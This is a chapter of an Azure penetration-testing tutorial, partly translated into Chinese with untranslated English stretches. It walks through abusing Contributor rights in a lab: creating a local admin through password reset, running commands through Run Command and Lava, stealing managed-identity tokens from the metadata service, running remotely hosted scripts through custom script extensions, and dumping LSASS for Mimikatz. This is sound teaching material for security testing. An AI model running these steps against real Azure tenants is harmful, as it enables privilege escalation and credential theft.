- "### 5 利用 IaaS 服务上的 Contributor 权限\n\n在本书的上一章中，我们探讨了如何从 Reader RBAC 角色提升权限到 Contributor\
  \ 角色。在本章中，我们将更进一步，讨论如何利用 Contributor 角色的权限来攻击基础设施即服务（IaaS）工作负载，以实现权限提升和数据外泄的目标。我们还将介绍如何使用\
  \ Contributor 角色搜寻其他凭据，这些凭据可用于在环境中超越 Contributor 访问角色的正常范围进行横向移动。\n\n以下是本章涵盖的主要主题：\n\
  \n- 回顾 Contributor RBAC 角色\n- 理解 Contributor IaaS 提权目标\n- 利用 Contributor 权限攻击 Azure\
  \ 平台功能\n- 从 Azure VM 中提取数据\n\n#### 技术需求\n\n在本章中，我们将使用以下工具：\n\n- PowerZure: https://github.com/hausec/PowerZure\n\
  - MicroBurst: https://github.com/NetSPI/MicroBurst\n- Lava: https://github.com/mattrotlevi/lava\n\
  \nMicroBurst 和 PowerZure 应该已经从之前的章节安装在你的渗透测试**虚拟机（VM）**上，但 Lava 将是本章的新增工具。本章的所有示例都可以使用我们在*第2章，构建你自己的环境*中创建的渗透测试\
  \ VM，或使用同等配置的 Windows 桌面来执行。\n\n#### 回顾 Contributor RBAC 角色\n\n正如我们在本书第一章中简要提到的，内置的\
  \ Contributor RBAC 角色授予管理*分配范围内的所有资源*（管理组、订阅或资源组）的完全访问权限，但限制其向其他用户或身份分配权限。\n\n鉴于该角色的访问级别，我们的重点不仅是使用这些权限，还包括如何利用它们来攻击用户的错误配置，以实现权限提升和横向移动。我们将通过利用\
  \ Azure 平台功能来实现这一点，这些功能可用于在 IaaS 工作负载（例如 VM 和**虚拟机规模集（VMSSes）**）上运行操作系统级命令/脚本。\n\
  \n> **重要说明**\n>\n> 对于在本地 Windows 环境中更有经验的人来说，Contributor 访问权限类似于在大多数系统上拥有一个具有本地管理员权限的域账户。你有权管理基础设施并进行更改，但无权向域中添加新用户，也无权在域管理员级别进行全局更改。\n\
  \n以下是 Contributor 角色有权使用且我们可以滥用的一些 IaaS 平台功能：\n\n- 重置 VM 上的本地用户密码\n- 以特权用户身份在 VM\
  \ 上运行命令\n- 安装和执行 VM 扩展\n- 导出未加密的操作系统磁盘以供分析\n\n请注意，这些操作可能是环境中明显的状态更改，如果执行不当，可能会导致\
  \ IaaS 资源出现问题。使用这些功能进行攻击时请务必谨慎。我们将在本章稍后的部分介绍这些功能，但首先，让我们完成设置 Azure 订阅以准备本章后续练习的过程。\n\
  \n#### 动手练习 – 为 Contributor（IaaS）利用场景做准备\n\n这个动手练习将为我们完成本章其余练习做准备。要跟随本章介绍的场景进行操作，你需要在自己的\
  \ Azure 订阅中设置一个具有 Contributor 权限的用户，并配置一些易受攻击的工作负载。我们使用 PowerShell 脚本实现了自动化，你可以从\
  \ Azure Cloud Shell 运行该脚本。\n\n以下是本练习要完成的任务：\n\n1. 打开 Web 浏览器，浏览到 Azure 门户 https://portal.azure.com。使用\
  \ azureadmin 凭据登录。\n\n2. 在 Azure 门户中，单击 Azure 门户右上角的 Cloud Shell 图标。选择 PowerShell：\n\
  \n   ![](img/4fa338e84e0a590967a142dd798ba4e2_189_0.png)\n\n   图5.1 – 单击图标打开 Cloud\
  \ Shell\n\n3. 在 Cloud Shell 窗格内的 PowerShell 会话中，运行以下命令下载脚本，以创建具有 Contributor 权限的用户账户并设置所需的易受攻击工作负载。同时，验证下载：\n\
  \n   ```\n   PS C:\\> Invoke-WebRequest http://bit.ly/contributor-iaas-scenarios\
  \ -O contributor-iaas-scenarios.ps1\n   PS C:\\> Get-ChildItem\n   ```\n\n   以下是其截图：\n\
  \n   ![](img/4fa338e84e0a590967a142dd798ba4e2_190_0.png)\n\n   图5.2 – 下载 Contributor\
  \ IaaS 场景脚本\n\n4. 使用以下命令运行已下载的脚本，以配置本章练习所需的对象和资源：\n\n   ```\n   PS C:\\> ./contributor-iaas-scenarios.ps1\n\
  \   ```\n\n   当提示输入密码时，输入 myPassword123（或你选择的密码），然后按 Enter。等待脚本部署完成。部署可能需要约 8 分钟才能完成：\n\
  \n   ![](img/4fa338e84e0a590967a142dd798ba4e2_190_1.png)\n\n   图5.3 – Contributor\
  \ IaaS 场景脚本的输出\n\n#### 这个脚本做什么？\n\n该脚本在 Azure 订阅中创建一个具有 Contributor 权限的用户账户。该脚本还会设置图5.4中所示的资源和对象：\n\
  \n- 一台名为 winvm01 的已开机 Windows VM\n- 一台名为 winvm02 的已关机 Windows VM\n- 一台名为 linuxvm01\
  \ 的已开机 Linux VM\n\n以下是添加到你的测试订阅中的资源示意图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_191_0.png)\n\
  \n图5.4 – Contributor IaaS 利用场景\n\n5. 脚本完成后，后续练习所需的关键信息将显示在输出部分。将这些信息复制到记事本文档中，以备后用。\n\
  \n在我们开始在 Azure VM 上随机执行命令之前，我们需要理解为什么要运行这些命令。假设我们对订阅中的所有 VM 拥有 Contributor 权限，为什么还要费心运行额外的命令？\n\
  \n简单的答案是“寻找可用于提升权限的凭据”，但可能导致这种提权的凭据有多种选择。我们试图强调在攻击 Azure VM 时需要实现的四个主要目标：\n\n- 本地凭据搜寻\n\
  - 域凭据搜寻\n- 横向网络移动机会\n- 租户凭据搜寻\n\n在接下来的几个小节中，我们将详细讨论这四个目标。\n\n#### 本地凭据搜寻\n\n能够以特权用户身份在\
  \ Azure VM 上运行命令，为收集本地凭据（哈希或明文）提供了绝佳机会，这些凭据可能是转向租户中其他系统、账户和订阅，甚至已连接的本地系统的关键。管理员在不同环境的多台系统上重复使用相同的本地凭据，以及为域账户使用相同凭据，这是非常常见的。这种攻击可以同时应用于\
  \ Windows 和 Linux 系统，并且它们甚至可能在不同操作系统之间共享凭据。\n\n#### 域凭据搜寻\n\nAzure VM 可以是独立系统，也可以加入更大的\
  \ Active Directory（AD）域。如果 VM 已加入域，则从 VM 收集信息的影响可能会更大。通常情况下，在订阅中具有特权角色的 Azure AD\
  \ 用户同时也是登录到这些 VM 的用户。\n\n通过从每个 VM 收集凭据，我们可能能够获得更高特权用户的明文凭据（或哈希）。需要注意的是，此时的域凭据可以是明文、哈希或缓存的凭据。哈希或缓存的凭据有可能被破解，从而揭示明文密码。\n\
  \n收集域凭据可能是在向域管理员或企业管理员权限迈进过程中的重要一步。到那时，我们将能够转储域的所有密码哈希，或重置我们想要访问的特权账户的密码。\n\n\n\n\
  \n#### 横向网络移动机会\n\n由于 VM 已部署到 Azure 中客户管理的虚拟网络中，因此组织通常会将其传统网络与 Azure 虚拟网络建立连接。能够在\
  \ Azure VM 上运行命令使我们有机会发现可能与其连接的网络中的服务和资源，并寻找利用它们的途径。\n\n运行命令的能力也可能带来绕过防御的机会。在某些情况下，本地\
  \ Azure 访问和远程 Azure 访问的 **多因素身份验证 (MFA)** 要求可能不同。作者曾见过要求从互联网访问时进行 MFA，但从受信任的内部本地\
  \ IP 地址进行连接时则不要求 MFA 的环境。\n\n在本地环境中提升权限后，dump 并破解租户管理员账户的凭据后，可能可以直接从本地系统或 Azure\
  \ VM 登录到 Azure 管理界面。\n\n#### 租户凭据搜寻\n\n在某些情况下，组织会在 Azure 中托管特权访问工作站或跳板机。这些是管理员可用于对其环境执行特权操作的系统。我们会尝试从这些机器收集缓存的访问令牌或其他凭据以供重用。\n\
  \n本章后面我们将介绍如何在 Azure VM 上识别托管身份。这些身份也可以通过从元数据服务生成令牌的方式，从 VM 升级到 Azure 租户。生成的令牌随后可用于从可能原本无法访问的其他服务收集敏感信息。\n\
  \n现在我们了解了目标，让我们来看一下实现这些目标的不同利用场景。\n\n#### 利用 Contributor 权限的 Azure 平台功能\n\n拥有 Contributor\
  \ 角色访问权限后，我们拥有丰富的平台级功能，可用于管理环境中的 VM。由于我们是以渗透测试者的身份来使用这些功能，我们对这些功能的使用案例可能与普通用户略有不同。\n\
  \n#### 利用密码重置功能\n\nAzure VM 的密码重置功能旨在简化使用安装在每台 Azure VM 上的 VM 代理重置本地 Azure VM 用户密码的过程。然而，此功能可被滥用来在\
  \ Azure 中的 Windows 和 Linux VM 上创建具有管理权限的新本地用户！\n\n此功能可从 Azure 门户（图 5.6）或 Azure 命令行工具中使用。诸如\
  \ Lava 之类的利用工具也可以利用此功能大规模重置 VM 密码。渗透测试者可以利用此功能从 Azure 平台横向移动到 IaaS 工作负载，以推进攻击链：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_195_0.png)\n\n图 5.6 – 门户中 VM 的示例密码重置\n\
  \n要使用 Azure CLI 为 VM 创建本地用户，我们将使用以下命令：\n\n```\naz vm user update -u username -p\
  \ password -n <VM_Name> -g <Resource_Group>\n```\n\n要使用 Azure PowerShell 为 VM 创建本地用户，我们可以使用以下命令：\n\
  \n```\nSet-AzVMAccessExtension -ResourceGroupName \"<Resource_Group>\" -Location\
  \ \"<Location>\" -VMName \"<VM_Name>\" -Name \"<Extension_Name>\" -TypeHandlerVersion\
  \ \"2.4\" -UserName \"<Username>\" -Password \"<Password>\"\n```\n\n接下来，我们将介绍使用此功能以本地管理员身份访问\
  \ VM 的过程。\n\n#### 实践练习 – 利用密码重置功能创建本地管理员用户\n\n在本练习中，我们将利用 Azure VM 的密码重置功能创建一个可用于连接\
  \ VM 的本地管理员用户，在其中搜寻凭据。以下是本练习中我们将完成的任务：\n\n- 1. 在你的渗透测试 VM 上打开 PowerShell。\n- 2.\
  \ 在 PowerShell 控制台中，使用以下命令对 Azure 进行身份验证：\n- 3. 在提示时，输入你在本章第一个练习的脚本输出中获得的 Contributor\
  \ 用户凭据：\n\n```\nConnect-AzAccount\n```\n\n以下是此操作的截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_196_0.png)\n\
  \n图 5.7 – 对订阅进行身份验证\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_196_1.png)\n\n图\
  \ 5.8 – Connect-AzAccount 身份验证提示\n\n你现在已使用 Contributor 凭据进行身份验证。\n\n4. 使用以下命令获取订阅中的\
  \ VM 列表：\n\n```\nGet-AzVM\n```\n\n以下是命令输出的截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_197_0.png)\n\
  \n图 5.9 – 可用 VM 列表\n\n5. 使用以下命令在 winvm01 VM 上创建新的本地用户：\n\n```\nSet-AzVMAccessExtension\
  \ -ResourceGroupName \"PENTEST-RG\" -VMName \"winvm01\" -Credential (get-credential)\
  \ -typeHandlerVersion \"2.0\" -Name VMAccessAgent\n```\n\n在提示时，输入 pentestuser 作为用户名，secretPass123\
  \ 作为密码，然后单击确定。\n\n以下是此过程的截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_197_1.png)\n\
  \n图 5.10 – 密码重置功能的示例\n\n6. 使用以下命令获取 winvm01 的公共 IP：\n\n```\nGet-AzPublicIpAddress\
  \ -Name winvm01* | Select IpAddress\n```\n\n请记住，如果 VM 没有公共 IP 或 RDP 端口未打开，你始终可以使用\
  \ Contributor 角色权限将服务暴露在公共 IP 上。这在大多数环境中都是重大的状态更改并增加风险，因此不建议在大多数环境中使用。\n\n以下是命令的截图：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_198_0.png)\n\n图 5.11 – 列出 VM 的公共 IP\n\
  \n7. 通过 RDP 连接到公共 IP，并使用用户名 pentestuser 和密码 secretPass123 进行身份验证。\n\n恭喜！你已成功使用 Contributor\
  \ 角色在 VM 上创建了本地管理员用户。\n\n这是一个非常方便的功能，但在评估期间并不总是合适的工具。假设我们在测试期间希望在行动上更隐蔽一些。在系统上创建新的本地管理员用户可能会触发一些警报。作为替代方案，我们可以使用原生的\
  \ Azure 功能直接在 VM 上运行命令，而无需额外的账户。\n\n#### 利用 Run Command 功能\n\nAzure VM 的 Run Command\
  \ 功能是使用 VM 代理远程在 VM 上运行脚本的平台功能。它可用于在 Windows VM 上运行 PowerShell 脚本，在 Linux VM 上运行\
  \ shell 脚本。它通常由管理员或开发人员用于快速诊断和修复 VM 访问和网络问题，并使 VM 恢复到良好状态。\n\n通过选择 **RunPowerShellScript**，或针对\
  \ Linux 选择 **RunShellScript**，我们可以运行自己的自定义命令在 VM 上。作为概念验证，我们将展示 whoami 命令的运行情况：\n\
  \n图 5.13 – Azure Run Command \"whoami\" 执行\n\n虽然这可能是运行 VM 命令的最简单方法之一，但它并不具可扩展性，并且门户在及时将命令执行结果返回给浏览器方面容易出现问题。这可能导致命令结果被截断，并且在命令完成执行之前发生会话超时。\n\
  \n例如，先前发出的简单 whoami 命令花费了 21 秒才将输出返回给浏览器。虽然对于如此简单的命令来说这是一个相当长的时间，但更复杂且处理更密集的命令可能需要更长的时间（数分钟）才能返回。\n\
  \n#### 从 Az PowerShell 模块运行命令\n\n为了获得更具可扩展性的命令执行选项，我们可以使用 Azure PowerShell 模块通过\
  \ PowerShell 管道的魔力在多个 VM 上排队命令。在 Azure 身份验证的 PowerShell 会话中，你可以使用以下命令列出正在运行的 Windows\
  \ VM 并将其转换为 VMs 变量：\n\n```\nPS C:\\> $VMs = Get-AzVM -Status | where {$_.PowerState\
  \ -EQ \"VM running\"} -and ($_.StorageProfile.OSDisk.OSType -eq \"Windows\")}\n\n\
  PS C:\\> $VMs | select ResourceGroupName,Name\nResourceGroupName       Name\n------------------\
  \       ----\nDEFAULT                  RunCommandTestVM\n```\n\n在前面的示例中，我们知道系统正在运行\
  \ Windows，因此我们将 ps1 文件传递给主机。我们首先需要将 whoami 命令输入到 ps1 文件中：\n\n```\nPS C:\\> echo\
  \ \"whoami\" > whoami.ps1\n```\n\n要执行命令，我们需要传入资源组和我们运行命令的 VM 的名称。得益于 PowerShell\
  \ 管道的魔力，我们可以将 VMs 变量传递给 Invoke-AzVMRunCommand 函数，并附带本地脚本：\n\n```\nPS C:\\> $VMs\
  \ | Invoke-AzVMRunCommand -CommandId 'RunPowerShellScript' -ScriptPath .\\whoami.ps1\n\
  \nValue[0]       :\n  Code         : ComponentStatus/StdOut/succeeded\n  Level \
  \       : Info\n  DisplayStatus : Provisioning succeeded\n  Message      : nt authority\\\
  system\nValue[1]       :\n  Code         : ComponentStatus/StdErr/succeeded\n```\n\
  \n\n\n\n\n| Level | Info |\n| --- | --- |\n| DisplayStatus | Provisioning succeeded\
  \ |\n| Message |  |\n| Status | Succeeded |\n| Capacity | 0 |\n| Count | 0 |\n\n\
  虽然这种方法对于我们的示例环境来说是可以的，但它会尝试在订阅中的所有 VM 上运行你的 PowerShell 脚本。在正常的 Azure 渗透测试中，你可能希望专注于单个\
  \ VM 进行命令执行。\n\n这可以通过指定单个 VM 和资源组来实现，也可以通过使用我们之前创建的 VMs 变量的索引来实现。记住 PowerShell 中的索引从\
  \ 0 开始，我们可以将 $VMs[0] 传递给相同的 Invoke-AzRunCommand 函数，以在列表中的第一个 VM 上运行我们的命令。\n\n####\
  \ 从 Azure REST API 运行命令\n\n这可能是运行 VM 命令最困难的方式，但幸运的是，我们可以使用脚本使此过程更轻松。虽然这与我们标准的经过身份验证的\
  \ Contributor 用户有所偏离，但我们可能会遇到拥有托管身份令牌访问权限且具有 Contributor 角色的情况。\n\n如上一章所述，如果我们有权访问具有托管身份的\
  \ VM，我们可以为该身份生成访问令牌，该令牌可用于管理 API。此令牌随后可与 MicroBurst 中的脚本一起使用，在其他 VM 上运行命令。\n\n以下是获取可用于访问\
  \ Azure 管理 API 端点的访问令牌的示例命令：\n\n```text\nroot@LinuxVM:~# curl -H Metadata:true -s\
  \ 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F'\
  \ | jq\n```\n\n以下是命令及其输出的截图：\n\n```text\nroot@LinuxVM:~#\nroot@LinuxVM:~# curl -H\
  \ Metadata:true -s 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F'\
  \ | jq\n{\n  \"access_token\": \"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsInR5cCI6ImNp...\"\
  \n}\n```\n\nFigure 5.14 – Using curl to query the metadata service\n\n获得令牌后，可以利用\
  \ MicroBurst 工具包 REST 部分中的 Invoke-AzVMCommandREST 命令，使用获得的令牌运行命令。该函数会提示你选择订阅和要运行命令的\
  \ VM。由于命令通过 REST API 运行，我们将无法看到命令的结果。要查看命令的直接结果，我们需要强制 VM 回调给我们或创建一些我们已在机器上运行命令的证据（whoami\
  \ > test.txt）。以下是使用此方法的示例：\n\n```text\nPS C:\\> $mgmtToken = \"TOKEN GOES HERE\"\
  \nPS C:\\> Invoke-AzVMCommandREST -commandToExecute \"whoami > test.txt\" -managementToken\
  \ $mgmtToken\n204cce89-27de-4669-a48b-04c27255e05e\nExecuting command on target\
  \ VM: RunCommandTestVM\n```\n\n运行此命令后，我们可以转到 VM 并在 VM 上查找 test.txt 文件，以证明命令已运行。在典型的测试中，我们更有可能使用这种命令执行方法来从\
  \ VM 启动反向 shell 连接。\n\n从实际渗透测试的角度来看，这种命令执行方法可能是最有用的方法之一。随着越来越多的组织将遗留应用程序迁移到云中，将会有更多机会利用应用程序服务器并从\
  \ VM 和 App Service 主机收集访问令牌。\n\n#### 介绍 Lava\n\nLava 是一个基于 Python 的 Microsoft Azure\
  \ 漏洞利用框架。它具有多个内置模块，可用于利用 Azure 中的各种配置错误。本书的其中一位作者定期为该项目做出贡献。我们将在下一个动手练习中使用它来利用特权\
  \ VM 进行角色提升。\n\n**Lava information**\n\n**Creator**: Matt Rotlevi (Twitter: @mattrotlevi)\n\
  \n**Open Source or Commercial**: Open source project\n\n**GitHub Repository**: https://github.com/mattrotlevi/lava\n\
  \n**Language**: Python\n\n#### 动手练习 – 使用 Lava 利用特权 VM 资源\n\n在本练习中，我们将在 pentest VM\
  \ 上的 WSL 中下载 Lava，使用它查找 Azure 订阅中的特权 IaaS 资源，然后从 Contributor 角色提升到 Owner 角色。\n\n\
  以下是本练习中我们将完成的任务：\n\n- 使用 WSL 中的 Azure CLI 工具对 Azure 进行身份验证。\n- 在 WSL 中下载 Lava。\n\
  - 使用 Lava 模块获取订阅中特权 VM 的列表。\n- 使用 Lava 模块利用具有 Owner 角色分配的 VM。\n\n让我们开始！\n\n1. 在你的\
  \ pentest VM 上打开 PowerShell。\n2. 在 PowerShell 控制台中，输入 bash 以切换到 Windows Subsystem\
  \ for Linux。\n3. 使用以下命令切换到 root 用户。这对于我们想要执行的安装任务是必需的。提示时输入管理员密码：\n\n```text\nazureuser@PentestVM:~#\
  \ sudo su -\n```\n\n4. 使用 az login Azure CLI 命令对 Azure 进行身份验证：\n\n```text\nroot@PentestVM:~#\
  \ az login\n```\n\n5. 提示时，输入你在本章第一个练习的脚本输出中获得的 Contributor 凭据：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_205_0.png)\n\
  \nFigure 5.15 – Az login password prompt\n\n你现在已使用 Contributor 凭据进行身份验证。\n\n6. 使用以下命令下载\
  \ Lava：\n\n```text\nroot@PentestVM:~# git clone https://github.com/mattrotlevi/lava.git\n\
  ```\n\n以下是命令及其输出的截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_205_1.png)\n\n\
  Figure 5.16 – Cloning the Lava GitHub repository\n\n7. 切换到 Lava 目录并使用以下命令运行它：\n\n\
  ```text\nroot@PentestVM:~# cd lava/\nroot@PentestVM:~# python3 lava.py\n```\n\n\
  它看起来是这样的：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_206_0.png)\n\nFigure 5.17\
  \ – Lava initialization screenshot\n\n8. 在 Lava 控制台中，使用 whoami 命令确认已认证的用户：\n\n```text\n\
  Lava $> whoami\n```\n\n以下是命令及其输出的截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_206_1.png)\n\
  \nFigure 5.18 – Results of the Lava whoami command\n\n9. 使用以下命令列出 Lava 中的所有模块：\n\
  \n```text\nLava $> ls\n```\n\n它看起来是这样的：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_207_0.png)\n\
  \nFigure 5.19 – Results of the Lava ls command\n\nLava 有很多模块可用于在不同场景下利用资源，但在本章中，我们将使用两个主要模块：`vm_list_privileged`\
  \ 和 `vm_rce`。\n\n10. 使用 `vm_list_privileged` 模块检查订阅中是否有任何 VM 与特权托管身份相关联。要在 Lava\
  \ 中执行模块，命令需要以 `exec` 关键字为前缀：\n\n```text\nexec vm_list_privileged\n```\n\n以下是命令及其输出的截图。你可以看到从截图中，模块找到了一个\
  \ VM，但该 VM 没有关联的托管身份（1）。你还可以看到模块找到了另一个具有关联特权托管身份的 VM（2）。模块还显示了分配给 VM 的角色和角色分配范围（3）：\n\
  \n```text\nLava $> exec vm_list_privileged\n[+] getting vm's in subscription [+]\n\
  WARNING: Command group 'vm' is experimental and under development. Reference and\
  \ support levels: https://aka.ms/CLI_refstatus\nWARNING: Command group 'vm' is experimental\
  \ and under development. Reference and support levels: https://aka.ms/CLI_refstatus\n\
  [++++++] vm found but not privileged [++++++]\n[++++++++++++++++++++++++++++++++++++++++++++++++++]\n\
  {'app_id': '4aab270b-716b-441e-8753-41d09e5ade89',\n 'managed_identity': 'SystemAssigned',\n\
  \ 'name': 'linuxvm01',\n 'os': 'Linux',\n 'privateIp': ['10.0.0.6'],\n 'publicIp':\
  \ ['51.140.11.174'],\n 'resource_group': 'PENTEST-RG',\n 'username': 'azureuser',\n\
  \ 'vm_size': 'Standard_DS1_v2'}\n[{'role': 'Owner',\n  'scope': '/subscriptions/204cce89-27de-4669-a48b-04c27255e05e'}]\n\
  [++++++++++++++++++++++++++++++++++++++++++++++++++]\n```\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_208_0.png)\n\
  \n总共，模块应列出两个具有特权角色分配的 VM（假设你删除了上一章的 VM）：一个具有订阅范围 Owner 角色分配的 Linux VM 和一个具有 Contributor\
  \ 角色分配的 Windows VM。记下找到的具有所有者权限的 Linux VM 的名称（`linuxvm01`）和资源组（`pentest-rg`）。由于我们已经拥有\
  \ Contributor 角色分配的凭据，我们将专注于利用具有 Owner 角色分配的 VM 以获取其令牌进行权限提升。\n\n11. 使用 `vm_rce`\
  \ 模块以 Contributor 身份利用 Run Command 功能。你需要指定 VM 名称和资源组，如下所示：\n\n```text\nLava $>\
  \ exec vm_rce -rgrp PENTEST-RG -vm_name linuxvm01\n```\n\n\n\n\n\nHere is a screenshot\
  \ of the command and its output. You should now see a display that looks like shell\
  \ access to the Linux VM that has the Owner role assignment. We can either start\
  \ running commands as an owner from within this VM or we can obtain an access token\
  \ that we can reuse outside the VM. We will go with the latter option in this case.\
  \ It is worth noting that this is not an actual shell; in the background, Lava will\
  \ take the command input, use the Run Command functionality to execute the command,\
  \ and return the output!\n\n```\nLava $> exec vm_rce -rgrp PENTEST-RG -vm_name linuxvm01\n\
  [+] getting shell info [+]\nalright! here's a nice shell!\nazureuser@linuxvm01$\
  \ _\n```\n\nFigure 5.21 – Results of the exec vm_rce module in Lava\n\n12. In the\
  \ shell, run the following command to obtain an access token for the resource manager.\
  \ This will obtain an access token that can be used to make API calls with the owner\
  \ privileges:\n\n```\nazureuser@linuxvm01$ curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com'\
  \ -H Metadata:true\n```\n\nHere is a screenshot of the command and its output:\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_209_0.png)\n\nFigure 5.22 – Results of\
  \ the metadata token request\n\n13. Highlight and copy only the value of the access\
  \ token, as shown in the following screenshot. Make sure you do not copy the trailing\
  \ comma:\n\n```\n[stdout]\n{\"access_token\":\"eyJ0eXAioiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doW...\"\
  }\n```\n\nFigure 5.23 – Example token output\n\n14. Type exit and press Enter to\
  \ return to the Lava console. Type exit again and press Enter to return to the Bash\
  \ shell in WSL. Set the obtained token as a variable using the following command:\n\
  \n```\nroot@PentestVM:~# TOKEN=<ACCESS_TOKEN_FROM_PREVIOUS_STEP>\n```\n\nHere is\
  \ a screenshot of the command and its output:\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_211_0.png)\n\
  \nFigure 5.24 – Results of exiting the shell and Lava and setting the token\n\n\
  15. Use the token to run commands against the resource manager with the owner privilege.\
  \ To install jq, execute the apt install jq command. You can try the following commands,\
  \ but we will only show a screenshot of the first command. For ease, the commands\
  \ are included in the file at this URL: http://bit.ly/tokenexploit. Feel free to\
  \ download it:\n\n```\n#### Get a list of subscriptions\n```\n\n```\ncurl --header\
  \ \"Authorization: Bearer ${TOKEN}\" https://management.azure.com/subscriptions?api-version=2020-01-01\
  \ | jq\n```\n\n```\n#### Store the subscription ID in a variable\n```\n\n```\nSUB_ID=$(curl\
  \ --header \"Authorization: Bearer ${TOKEN}\" https://management.azure.com/subscriptions?api-version=2020-01-01\
  \ | jq -r '.value[].subscriptionId')\n```\n\n```\n#### Get a list of resource groups\n\
  ```\n\n```\ncurl --header \"Authorization: Bearer ${TOKEN}\" https://management.azure.com/subscriptions/${SUB_ID}/resourcegroups?api-version=2019-10-01\
  \ | jq\n```\n\n```\n#### Get a list of resources\n```\n\n```\ncurl --header \"Authorization:\
  \ Bearer ${TOKEN}\" https://management.azure.com/subscriptions/${SUB_ID}/resources?api-version=2019-10-01\
  \ | jq\n```\n\nHere is a screenshot of the first command and its output:\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_212_0.png)\n\
  \nFigure 5.25 – Example list of the available subscriptions\n\nCongratulations!\
  \ You have successfully performed a privilege escalation from the Contributor role\
  \ to the Owner role.\n\n#### Executing VM extensions\n\nAs a final note on this\
  \ section, we wanted to include using VM extensions to run commands on VMs. While\
  \ this is not the simplest way to run commands, it may be your only option in certain\
  \ situations.\n\nAzure VM extensions are tools used by administrators to configure\
  \ VMs after they have been deployed. As a way of customizing these extensions for\
  \ different uses, Microsoft allows for custom script extensions to be created, based\
  \ on a schema that they have defined.\n\nThis schema includes file URIs or URLs\
  \ that point to script files that allow us to specify a PowerShell file that we\
  \ want to execute. As attackers, we will need a web server to host the file URIs.\
  \ We would suggest either using the web hosting feature built into Azure Blob Storage\
  \ or using Azure App Service for hosting the files.\n\nThe command for running the\
  \ custom script extension consists of the following parameters:\n\n- **ResourceGroupName**:\
  \ The resource group for the VM.\n- **VMName**: The name of the VM.\n- **Location**:\
  \ The region the VM is in.\n- **FileUri**: The HTTP/HTTPS URL for the script file.\n\
  - **Run**: The file to run; this should be the same as the ps1 filename.\n- **Name**:\
  \ The name that the custom script extension will have:\n\n```\nPS C:\\> Set-AzVMCustomScriptExtension\
  \ -ResourceGroupName TEST -VMName PentestVM -Location westcentralus -FileUri 'http://book.azurepentesting.com/whoami.ps1'\
  \ -Run 'whoami.ps1' -Name CustomScriptExtension\n```\n\nIn the preceding command\
  \ example, we will run the whoami.ps1 script (hosted on book.azurepentesting.com)\
  \ on the PentestVM host. In a more practical scenario, we would use the custom script\
  \ extension to create a reverse shell or add a new user to the VM.\n\n> **Important\
  \ note**\n> This chapter happens to feature two research items from one of the book's\
  \ technical reviewers, Jake Karnes. We highly recommend checking out his in-depth\
  \ post on using Azure VM extensions to launch Covenant C2 implants on Azure VMs:\
  \ https://blog.netspi.com/attacking-azure-with-custom-script-extensions/.\n\nWhile\
  \ this is another blind command execution method, it can be handy for getting an\
  \ initial foothold onto a VM. This method also concludes our section on the Azure\
  \ features that we can use as a Contributor on a subscription. Next, we will review\
  \ the data that we want to gather from the VMs using the methods we just reviewed.\n\
  \n#### Extracting data from Azure VMs\n\nWe now have a good understanding of many\
  \ of the options that we have for manipulating Azure VMs as a Contributor. With\
  \ this access, we will want to start gathering sensitive information and credentials\
  \ from these VMs, to escalate privileges in the tenant and, potentially, the AD\
  \ domain.\n\nHere are some of the general types of information that we will want\
  \ to gather from the VMs:\n\n- Windows NTLM hashes and in-memory credentials\n-\
  \ Credentials stored in VM extension settings\n- Sensitive files and local administrator\
  \ password hashes\n\nWe have already covered finding managed identities and gathering\
  \ tokens from them, but they are also a key target for extracting credential data\
  \ from VMs.\n\n#### Gathering local credentials with Mimikatz\n\nWhile an entire\
  \ book could be written on all the features of Mimikatz, we will just cover the\
  \ basics that are needed for extracting credentials from Windows VMs. The most basic\
  \ way of running Mimikatz is running the executable on a victim machine. While this\
  \ can work, any reasonably up-to-date Endpoint Detection and Response (EDR) software\
  \ will catch the executable as soon as it is written to the virtual disk.\n\nIf\
  \ we are dealing with a less mature EDR, we could try running it in memory with\
  \ the Invoke-Mimikatz PowerShell script, or by using another technique to load Mimikatz\
  \ directly into memory. This may be viable for some weaker EDR configurations, but\
  \ we see this get caught more frequently as well.\n\nFinally, we can try dumping\
  \ the LSASS process memory and parsing it offline with Mimikatz. This prevents us\
  \ from ever putting Mimikatz on a VM, and it is much less likely to throw out any\
  \ alerts. Many of the defensive tools are now monitoring the LSASS process and protecting\
  \ the memory space from being dumped, so your mileage may vary.\n\nOn the plus side,\
  \ it is not uncommon to run into a development VM with little to no endpoint protection\
  \ on it. These can be great sources of credentials or they can be totally empty\
  \ development machines. Either way, we will go through our final technique as an\
  \ example of running Mimikatz offline to parse an LSASS dump as follows:\n\n- 1.\
  \ On the target VM, open Task Manager (press Ctrl + Shift + Esc or type taskmgr\
  \ in the Start menu).\n\n\n\n\n+   2. 在 **详细信息** 选项卡下，找到 lsass.exe 进程。\n+   3. 右键单击\
  \ lsass 进程，然后选择 **创建转储文件**：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_215_0.png)\n\
  \n图 5.26 – 创建 LSASS 转储文件\n\n+   4. 当转储文件写入完成后，Windows 会共享生成的 .dmp 文件的路径。\n+   5.\
  \ 导航到该文件夹，将 .dmp 文件从 VM 复制到你的测试系统。\n+   6. 在你的测试系统上，打开一个特权 PowerShell 或 CMD 会话，并从\
